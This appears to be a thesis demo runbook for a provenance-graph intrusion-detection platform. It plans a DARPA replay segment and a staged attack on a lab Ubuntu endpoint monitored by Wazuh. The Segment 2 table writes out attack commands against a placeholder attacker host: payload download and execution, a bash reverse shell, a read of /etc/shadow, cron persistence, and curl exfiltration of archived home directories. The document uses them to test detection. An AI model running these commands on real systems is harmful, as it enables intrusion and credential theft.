# Demo Runbook — Recorded System Demonstration

> Companion to `sprint-3-deployed-platform.md`. Demo is **recorded, not live** (more leeway: stage
> clean runs, edit, narrate over). **No live number enters the thesis as a metric** (locked decision
> #8) — the citable figures are the frozen offline C3 results. Recording is a *qualitative platform
> PoC*.
> Endpoint scope decision (2026-06-14): **auditd process+network** telemetry (richer chain).

## The honest division (say this on camera, early)

The learned GNN/Orthrus models are DARPA-trained and **out-of-distribution on live Linux**, so the
*learned-model comparison* runs on **DARPA replay**. The **live Wazuh endpoint** demonstrates the
components that genuinely transfer to a real host — telemetry integration, the **L1 rule-engine
(Sigma-inspired)** detector, causal assembly, and the LLM narrative. Each component is shown where it
is valid; nothing is overclaimed.

Two recorded segments:
- **Segment 1 — DARPA replay** → `/compare` (FLASH vs our-Orthrus + composition floor) + a
  GNN-seeded incident → causal chain → LLM narrative. (Ch4 §4.2 made visual; in-distribution.)
- **Segment 2 — live endpoint** → stage a living-off-the-land attack on the monitored Ubuntu host →
  Wazuh captures → `wazuh-bridge` → graph → **rule-engine fires** → incident + LLM narrative + MITRE.

---

## Build prerequisites (must exist before recording — auditd path)

1. **`wazuh-bridge`** (`server/wazuh-bridge/`) — NOT YET BUILT. Tail Wazuh `alerts.json` /
   `archives.json`; map decoded auditd/FIM events → `NormalizedEvent` (PROCESS/FILE/SOCKET nodes;
   FORK/EXEC/READ/WRITE/CONNECT/SEND/DELETE edges); publish to `normalized_events`. `endpoint_id` =
   agent name.
2. **auditd rules on the agent** (`server/wazuh/agent`) — add execve/connect/open audit rules + Wazuh
   `<localfile>` for the audit log so process+network+file provenance is emitted (today the agent is
   FIM-only). auditd-in-container may need privileged / host-PID — if blocked, fall back to FIM-only
   chain (still records a file-centric incident).
3. **Attacker sink** — a tiny throwaway container/host providing: a payload over `python -m
   http.server`, a reverse-shell listener (`nc -lvnp`), and an exfil sink. One `attacker` container on
   `edr-network` is enough.
4. Confirm `rule-engine`, `graph-builder`, `llm-analyzer`, `api`, `dashboard` are up and that an
   endpoint-sourced `NormalizedEvent` actually reaches Neo4j + trips a rule (dry run before recording).

---

## Pre-flight staging (before hitting record)

- `docker compose up -d` — full stack warm; Neo4j reachable (`:7474`), dashboard (`:3000`), API
  (`:8000/docs`), RabbitMQ (`:15672`).
- Pre-pull/build all images; pre-generate **one** DARPA incident so Segment 1 has something to open
  instantly if needed.
- Reset Neo4j to a clean graph between segments so each recording starts uncluttered.
- Have the attacker container running with payload + listener ready.
- Decide window/edge caps (below) — keep the Neo4j label-less-write bottleneck off the path.

---

## Segment 1 — DARPA replay (learned-model story)

Commands:
```bash
docker compose up -d
docker compose --profile theia-sim run --rm theia-replay \
  --file ta1-theia-e3-official-6r.json.8 --limit 20000     # cap edges; do NOT push ~900k live
```
Show, in order:
1. **Dashboard overview** — graph populating, node/edge counts. Narrate: "DARPA THEIA replayed
   through the live path so the learned models see in-distribution data (Path A)."
2. **`/compare`** (the money shot) — FLASH floods File / 0 Process vs our-Orthrus few+precise on the
   **same graph + same Word2Vec features**. Punchline: the **composition floor** (non-parametric
   action-frequency table) reproduces the in-type ranking (ρ≈0.79–0.85) → the contrast is
   operating-point + node-type composition, not learned skill.
3. **Open one incident** — causal chain around a TP seed (detection↔reconstruction split made
   tangible: assembly fired only because given a true positive).
4. **LLM narrative + MITRE** — incident explained in prose with ATT&CK tags.
5. (Static) **KAIROS comparison panel** — never run live (locked decision #2).

Caption every on-screen number: "illustrative; cited figure is the offline C3 run."

---

## Segment 2 — live Wazuh endpoint (integration + rule story)

Narrate: "Now a real monitored Ubuntu endpoint. We run an attacker's living-off-the-land chain; Wazuh
captures it, the bridge maps it into the same provenance graph, and the L1 rule-engine catches the
sequence — no DARPA, no GNN, freshly generated telemetry."

**Staged attack chain** (each step trips a real rule in `rule-engine/rules/`):

| # | Action on endpoint | Rule it trips |
|---|---|---|
| 1 | `wget http://<attacker>/payload.sh -O /tmp/p.sh` | Wget Download to Temp Directory |
| 2 | `chmod +x /tmp/p.sh && /tmp/p.sh` | Download and Execute Pattern |
| 3 | `bash -i >& /dev/tcp/<attacker>/4444 0>&1` | Bash Reverse Shell via Network Connection |
| 4 | `cat /etc/shadow` (and `/etc/passwd`) | Credential File Direct Read |
| 5 | write to `/etc/cron.d/persist` | Cron Directory File Write |
| 6 | `tar czf /tmp/loot.tgz /home/<user>` | Data Staged via Archive Tool |
| 7 | `curl -F file=@/tmp/loot.tgz http://<attacker>/up` | Curl File Upload to External Host |
| 4+7 | (sequence) | Credential File Read + Exfiltration |

Put steps in a single `attack.sh` so the recording is one clean play. Pace it so events land in
order (small sleeps) — the FSM sequence rules need ordered causal edges.

Show, in order:
1. **Wazuh manager console** — the alerts appearing on the agent (proves the endpoint is genuinely
   monitored), then switch to *our* dashboard.
2. **Our dashboard** — the endpoint's provenance subgraph materializing (PROCESS→FILE/SOCKET edges).
3. **Incident** raised by the rule-engine — causal chain of the attack (download→exec→shell→cred
   read→persistence→exfil).
4. **LLM narrative + MITRE** for that incident — the analyst-facing payoff on live data.

---

## Recording logistics

- Record the two segments separately; stitch with a title card stating the honest division.
- Target ≤ 6–7 min total (≈3.5 each). Speed-ramp the graph-building waits in edit.
- Keep a terminal pane visible during Segment 2 so viewers see the actual attack commands run.
- Capture stills of: overview, `/compare`, both incidents, LLM narratives — for the slides and as
  zero-dependency fallback.

## Guardrails / captions (non-negotiable)

- Live = illustrative; offline C3 = citable. There is a known write-back gap (300 in-memory vs ~125
  written) — state it before anyone asks.
- The platform is an **architecture** claim, not a metric source.
- Segment 2 detection is the **rule-engine (L1)**, explicitly *not* the OOD learned models.

## Fallbacks

- If auditd-in-container is blocked: run the **FIM-only** chain (drop payload, modify watched
  sensitive file, write persistence file) → file-based rules fire; shallower chain but still a live
  incident.
- If the bridge is flaky: because it's recorded, retry until one clean run; keep stills as the hard
  fallback.

## Open questions

- Confirm with supervisor: recording embedded in slides vs played standalone at defense.
- Resolve live-weights ambiguity (`theia_novel` vs `theia_ours_v3`) so Segment 1 scores match the
  offline numbers (sanity, not a new metric).
- attacker host: dedicated container on `edr-network`, or the Docker host itself?
